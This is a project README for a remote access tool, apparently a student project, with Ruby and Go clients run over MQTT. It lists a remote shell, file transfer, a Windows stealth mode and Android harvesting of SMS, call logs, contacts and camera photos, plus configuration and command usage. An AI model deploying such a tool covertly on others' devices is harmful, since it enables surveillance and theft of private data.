# re: buRAT

buRAT 1.0 was written in java for my personal project and as a requirement for the degree of BS Computer Engineering, Home Automation Module was implemented.
https://github.com/reedleoneil/buRAT-1.0

buRAT 2.0 was re: written in ruby.
https://github.com/reedleoneil/buRAT-2.0

re: buRAT was re: mastered for IoT.


🔴 ruby client
- [x] remote shell
- [x] file upload and download
- [ ] windows specific feature (windows-stealth-mode branch)
- [x] android specific commands (termux branch)
  - audo_info
  - batter_status
  - call_log
  - camera_info
  - camera_photo
  - contact_list
  - sms_list
  - device_info
  - wifi_connection_info
  - wifi_scan_info
  
🔵 go client
- [x] remote shell
- [x] file upload and download
- [x] windows specific feature (windows-stealth-mode branch)
- [ ] android specific commands (termux branch)

📟 re commands
- command and control

Features to be implemented in the future:
- home automation


## Installation

Everything was tested and installed on Ubuntu 20.04 machine for the re commands and both ruby and go clients.
Only ruby and go clients were tested on Windows machine and re commands might have issues on windows.

Install ruby, golang and dependencies. golang is optional if you are not planning to use the go client.

Install a mqtt broker, you can find a list here https://mqtt.org/software/

Configure the mqtt broker address and port on the **re.conf** file for the re commands.

re.conf

```json
{
  "host" : "localhost",
  "port" : 1883
}
```
Configure the mqtt broker address and port for the clients on **burat.rb** for the ruby client and **burat.go** for the go client.

burat.rb on the init_mqtt() function

```ruby
@internals[:mqtt].host = 'localhost'
@internals[:mqtt].port = 1883
```

burat.go on the initMqtt() function

```golang
opts.AddBroker("tcp://localhost:1883")
```

Generate a RSA key pair in pem format and override **re.key** file for the private key, for the clients configure the key on **bushi.rb** for the ruby client and **bushi.go** for the go client.

bushi.rb

```ruby
burat.internals[:rsa].config({
:encoded_key => '-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA3UEh+HOkcBDCuJYRNgRb
GPRUCWZJp4PI2+X21AHPrK7EZ49eH2SNaKm6qivTzcv/+AQxNYzBZVU1AFKqSmKT
pueIIK6qEuh5GTnYsYiTXhNDdNLCFfXLDsc/adEAylSJg7NrBTf9NvanqcSPl/kC
ARNKGkusuh560tVI8NHIsPjwuN3oC49xbFSiyJfaoGa3RJijsMIgPM5zgS2DyJWH
6DxgX7/TbmXUVFkyPyfYhAizsuZijosmSI7SWIbQ7NaiJWdkiFp5lDRIjI5chHnY
CrP1DfupsO/t4iIRmwvB34WVjkJ7lPpZmpcsbLlVugNYJzT7jfunncMoFJ74dcJ+
5QIDAQAB
-----END PUBLIC KEY-----'
})
```
bushi.go

```golang
burat.Internals().RSA.Config(`-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA3UEh+HOkcBDCuJYRNgRb
GPRUCWZJp4PI2+X21AHPrK7EZ49eH2SNaKm6qivTzcv/+AQxNYzBZVU1AFKqSmKT
pueIIK6qEuh5GTnYsYiTXhNDdNLCFfXLDsc/adEAylSJg7NrBTf9NvanqcSPl/kC
ARNKGkusuh560tVI8NHIsPjwuN3oC49xbFSiyJfaoGa3RJijsMIgPM5zgS2DyJWH
6DxgX7/TbmXUVFkyPyfYhAizsuZijosmSI7SWIbQ7NaiJWdkiFp5lDRIjI5chHnY
CrP1DfupsO/t4iIRmwvB34WVjkJ7lPpZmpcsbLlVugNYJzT7jfunncMoFJ74dcJ+
5QIDAQAB
-----END PUBLIC KEY-----`)
```

## Usage

```sh
Usage: re_clear [options]
    -t, --topic=TOPIC                topic to be cleared
```

```sh
Usage: re_ls [options]
    -b, --bushi=BUSHI                target bushi
```

```sh
Usage: re_moteshell [options]
    -b, --bushi=BUSHI                target bushi
    -i, --id=ID                      id of remote shell
    -s, --shell=SHELL                shell to spawn
```

```sh
Usage: re_filerw [options]
    -b, --bushi=ID                   target bushi
    -i, --id=ID                      id of remote shell
    -m, --mode=MODE                  file mode read | write
    -s, --source=PATH                remote file path to read from
    -d, --destination=PATH           local file path to read to
    -z, --size=SIZE                  file size to read or write
    -r, --rate=BITS                  transfer rate default: 1024
```

## License
[GNU General Public License v3.0](https://github.com/reedleoneil/re-buRAT/blob/master/LICENSE)
